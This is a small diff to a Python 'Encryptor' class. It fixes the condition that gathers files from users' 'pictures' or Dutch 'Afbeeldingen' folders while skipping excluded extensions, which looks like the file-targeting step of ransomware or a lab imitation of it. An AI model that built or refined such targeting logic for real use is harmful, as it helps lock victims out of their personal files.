@@ -60,7 +60,7 @@ class Encryptor:
                                 not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
                             ):  
                                 
-                                if ("pictures" or "Afbeeldingen") in entry.path.lower(): #just filter on desktop and pictures
+                                if "pictures" in entry.path.lower() or "afbeeldingen" in entry.path.lower(): #just filter on desktop and pictures
                                     filepaths.append(entry.path)  # Store normal files
             
             except (PermissionError, FileNotFoundError):
